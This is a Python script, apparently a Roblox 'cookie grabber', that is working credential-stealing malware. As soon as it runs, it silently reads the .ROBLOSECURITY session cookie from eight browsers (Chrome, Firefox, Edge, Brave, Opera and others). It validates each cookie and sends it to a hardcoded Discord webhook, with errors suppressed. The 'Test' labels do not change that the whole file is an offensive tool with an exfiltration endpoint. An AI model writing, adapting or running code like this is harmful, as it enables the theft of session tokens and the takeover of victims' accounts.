webhook = "https://discord.com/api/webhooks/1127231313267662988/PfTHC8cHo0NwGXLtl1P1wL5IiW6M6oxyjE3TkfCTi72iea2dxq3uLV2dxfXSh2JZnpDl"

import robloxpy
import requests
import browser_cookie3

#------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Gets the info

def cookiecheckerandsend(cookie, platform):
    
    if not robloxpy.Utils.CheckCookie(cookie) == "Valid Cookie":
        return requests.post(url=webhook, data={"content":f"Dead Cookie\n|| ```{cookie}``` ||"})

    info = requests.get("https://www.roblox.com/mobileapi/userinfo",
    cookies={".ROBLOSECURITY":cookie}).json()

#------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Sends the logs to the webhooks

    requests.post(url=webhook, json={
        'username': "Cookie Grabber Test",
        'avatar_url': "https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
        'embeds': [{
                "title": f"🕯 Valid Account - {platform}",
                "description" : f"Test",
                "color" : 12452044,
                "fields": [
                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
                ],
                "footer": {
                    "text": "Cookie Grabber Test"
                }
            }
        ]
    }
)

#------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Logs the cookie's

def cookieLogger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Firefox')
    except:
        pass

    try:
        cookies = browser_cookie3.safari(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Safari')
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chromium')
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
    except:
        pass

    try:
        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera GX')
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera')
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Brave')
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chrome')
    except:
        pass

cookies = cookieLogger()
